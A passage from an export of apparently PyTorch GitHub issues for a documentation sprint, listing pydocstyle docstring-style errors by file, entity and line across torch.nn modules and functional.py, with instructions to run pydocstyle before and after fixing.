- **File**: `torch/nn/modules/module.py`, **Entity**: `named_modules`, **Line**: 2265, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_modules`, **Line**: 2265, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_modules`, **Line**: 2265, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_modules`, **Line**: 2265, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `train`, **Line**: 2309, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/nn/modules/module.py`, **Entity**: `eval`, **Line**: 2331, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/nn/modules/module.py`, **Entity**: `requires_grad_`, **Line**: 2349, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `requires_grad_`, **Line**: 2349, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/module.py`, **Entity**: `zero_grad`, **Line**: 2373, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `zero_grad`, **Line**: 2373, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/modules/module.py`, **Entity**: `zero_grad`, **Line**: 2373, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/nn/modules/module.py`, **Entity**: `share_memory`, **Line**: 2399, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/module.py`, **Entity**: `extra_repr`, **Line**: 2406, **Description**: First line should end with a period (not 'e')

cc @carljparker",False
"Fix docstring errors in pixelshuffle.py, sparse.py, rnn.py, pooling.py, upsampling.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelShuffle`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelShuffle`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelShuffle`, **Line**: 9, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelUnshuffle`, **Line**: 61, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelUnshuffle`, **Line**: 61, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelUnshuffle`, **Line**: 61, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool1d`, **Line**: 39, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool1d`, **Line**: 39, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool2d`, **Line**: 98, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool2d`, **Line**: 98, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool3d`, **Line**: 172, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool3d`, **Line**: 172, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool1d`, **Line**: 498, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool1d`, **Line**: 498, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool2d`, **Line**: 565, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool2d`, **Line**: 565, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool2d`, **Line**: 565, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool3d`, **Line**: 644, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool3d`, **Line**: 644, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool3d`, **Line**: 644, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `FractionalMaxPool2d`, **Line**: 736, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `FractionalMaxPool3d`, **Line**: 806, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `LPPool1d`, **Line**: 894, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `LPPool1d`, **Line**: 894, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `LPPool2d`, **Line**: 936, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `LPPool2d`, **Line**: 936, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `Embedding`, **Line**: 14, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `from_pretrained`, **Line**: 184, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `EmbeddingBag`, **Line**: 227, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `EmbeddingBag`, **Line**: 227, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `EmbeddingBag`, **Line**: 227, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `from_pretrained`, **Line**: 413, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `flatten_parameters`, **Line**: 149, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `RNN`, **Line**: 345, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `RNN`, **Line**: 345, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `LSTM`, **Line**: 565, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `LSTM`, **Line**: 565, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `GRU`, **Line**: 852, **Description**: 1 blank line required between summary line and description (found 2)
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `RNNCell`, **Line**: 1110, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `GRUCell`, **Line**: 1297, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `Upsample`, **Line**: 12, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingNearest2d`, **Line**: 175, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingNearest2d`, **Line**: 175, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingNearest2d`, **Line**: 175, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingBilinear2d`, **Line**: 220, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingBilinear2d`, **Line**: 220, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingBilinear2d`, **Line**: 220, **Description**: First line should end with a period (not 't')

cc @carljparker",False
"Fix docstring errors in padding.py, distance.py, dropout.py, adaptive.py, linear.py, flatten.py, lazy.py, instancenorm.py, fold.py, normalization.py, channelshuffle.py, conv.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `AdaptiveLogSoftmaxWithLoss`, **Line**: 20, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `AdaptiveLogSoftmaxWithLoss`, **Line**: 20, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `_get_full_log_prob`, **Line**: 245, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `_get_full_log_prob`, **Line**: 245, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `_get_full_log_prob`, **Line**: 245, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `_get_full_log_prob`, **Line**: 245, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `_get_full_log_prob`, **Line**: 245, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `log_prob`, **Line**: 263, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `log_prob`, **Line**: 263, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `log_prob`, **Line**: 263, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `log_prob`, **Line**: 263, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `predict`, **Line**: 283, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `predict`, **Line**: 283, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `predict`, **Line**: 283, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `predict`, **Line**: 283, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `predict`, **Line**: 283, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/modules/channelshuffle.py`, **Entity**: `ChannelShuffle`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/channelshuffle.py`, **Entity**: `ChannelShuffle`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/channelshuffle.py`, **Entity**: `ChannelShuffle`, **Line**: 9, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv1d`, **Line**: 1196, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv1d`, **Line**: 1196, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv2d`, **Line**: 1265, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv2d`, **Line**: 1265, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv3d`, **Line**: 1334, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv3d`, **Line**: 1334, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose1d`, **Line**: 1403, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose1d`, **Line**: 1403, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose2d`, **Line**: 1471, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose2d`, **Line**: 1471, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose3d`, **Line**: 1539, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose3d`, **Line**: 1539, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/distance.py`, **Entity**: `PairwiseDistance`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/distance.py`, **Entity**: `CosineSimilarity`, **Line**: 57, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout`, **Line**: 26, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout`, **Line**: 26, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout1d`, **Line**: 63, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout1d`, **Line**: 63, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout2d`, **Line**: 105, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout2d`, **Line**: 105, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout3d`, **Line**: 154, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout3d`, **Line**: 154, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `FeatureAlphaDropout`, **Line**: 238, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `FeatureAlphaDropout`, **Line**: 238, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/flatten.py`, **Entity**: `Flatten`, **Line**: 10, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/flatten.py`, **Entity**: `Flatten`, **Line**: 10, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/flatten.py`, **Entity**: `Unflatten`, **Line**: 56, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/fold.py`, **Entity**: `Fold`, **Line**: 11, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/fold.py`, **Entity**: `Fold`, **Line**: 11, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/fold.py`, **Entity**: `Fold`, **Line**: 11, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/modules/fold.py`, **Entity**: `Unfold`, **Line**: 157, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm1d`, **Line**: 91, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm1d`, **Line**: 91, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm1d`, **Line**: 167, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm1d`, **Line**: 167, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm2d`, **Line**: 206, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm2d`, **Line**: 206, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm2d`, **Line**: 283, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm2d`, **Line**: 283, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm3d`, **Line**: 322, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm3d`, **Line**: 322, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm3d`, **Line**: 399, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm3d`, **Line**: 399, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `_LazyProtocol`, **Line**: 11, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `_LazyProtocol`, **Line**: 11, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `_LazyProtocol`, **Line**: 11, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `LazyModuleMixin`, **Line**: 54, **Description**: First line should end with a period (not '""')
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `initialize_parameters`, **Line**: 222, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `has_uninitialized_params`, **Line**: 229, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `has_uninitialized_params`, **Line**: 229, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `_infer_parameters`, **Line**: 241, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `_infer_parameters`, **Line**: 241, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Identity`, **Line**: 22, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Linear`, **Line**: 49, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Linear`, **Line**: 49, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Bilinear`, **Line**: 135, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Bilinear`, **Line**: 135, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Bilinear`, **Line**: 135, **Description**: First line should end with a period (not '
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LocalResponseNorm`, **Line**: 15, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LocalResponseNorm`, **Line**: 15, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LocalResponseNorm`, **Line**: 15, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LayerNorm`, **Line**: 88, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LayerNorm`, **Line**: 88, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LayerNorm`, **Line**: 88, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `GroupNorm`, **Line**: 199, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `GroupNorm`, **Line**: 199, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `GroupNorm`, **Line**: 199, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ConstantPad1d`, **Line**: 32, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ConstantPad2d`, **Line**: 83, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ConstantPad3d`, **Line**: 134, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReflectionPad1d`, **Line**: 185, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReflectionPad2d`, **Line**: 226, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReflectionPad3d`, **Line**: 278, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReplicationPad1d`, **Line**: 342, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReplicationPad2d`, **Line**: 383, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReplicationPad3d`, **Line**: 435, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ZeroPad1d`, **Line**: 476, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ZeroPad2d`, **Line**: 528, **Description**: 1 blank line required after class docstring (found 0)

cc @carljparker",False
Fix docstring errors in functional.py module: docs triaged medium docathon-h2-2023,"Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/functional.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/functional.py`, **Entity**: `fractional_max_pool2d_with_indices`, **Line**: 433, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `fractional_max_pool3d_with_indices`, **Line**: 532, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `max_pool1d_with_indices`, **Line**: 641, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `max_pool2d_with_indices`, **Line**: 727, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `max_pool3d_with_indices`, **Line**: 813, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `max_unpool1d`, **Line**: 931, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/functional.py`, **Entity**: `max_unpool2d`, **Line**: 967, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/functional.py`, **Entity**: `max_unpool3d`, **Line**: 999, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool2d`, **Line**: 1030, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool2d`, **Line**: 1030, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool2d`, **Line**: 1030, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool1d`, **Line**: 1055, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool1d`, **Line**: 1055, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool1d`, **Line**: 1055, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_max_pool1d_with_indices`, **Line**: 1076, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_max_pool2d_with_indices`, **Line**: 1118, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_max_pool3d_with_indices`, **Line**: 1162, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool2d`, **Line**: 1219, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool2d`, **Line**: 1219, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool2d`, **Line**: 1219, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool3d`, **Line**: 1236, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool3d`, **Line**: 1236, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool3d`, **Line**: 1236, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `dropout`, **Line**: 1254, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `dropout`, **Line**: 1254, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/functional.py`, **Entity**: `alpha_dropout`, **Line**: 1274, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `dropout1d`, **Line**: 1286, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `dropout1d`, **Line**: 1286, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/functional.py`, **Entity**: `dropout2d`, **Line**: 1324, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `dropout2d`, **Line**: 1324, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/functional.py`, **Entity**: `dropout3d`, **Line**: 1368, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `dropout3d`, **Line**: 1368, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/functional.py`, **Entity**: `feature_alpha_dropout`, **Line**: 1407, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `feature_alpha_dropout`, **Line**: 1407, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/functional.py`, **Entity**: `relu`, **Line**: 1465, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `relu`, **Line**: 1465, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `glu`, **Line**: 1490, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `glu`, **Line**: 1490, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `hardtanh`, **Line**: 1515, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `hardtanh`, **Line**: 1515, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `relu6`, **Line**: 1541, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `relu6`, **Line**: 1541, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `elu`, **Line**: 1557, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `selu`, **Line**: 1581, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `selu`, **Line**: 1581, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `celu`, **Line**: 1610, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `celu`, **Line**: 1610, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `leaky_relu`, **Line**: 1637, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `leaky_relu`, **Line**: 1637, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `rrelu`, **Line**: 1687, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `rrelu`, **Line**: 1687, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `tanhshrink`, **Line**: 1754, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `tanhshrink`, **Line**: 1754, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `softsign`, **Line**: 1766, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `softsign`, **Line**: 1766, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `softmin`, **Line**: 1806, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
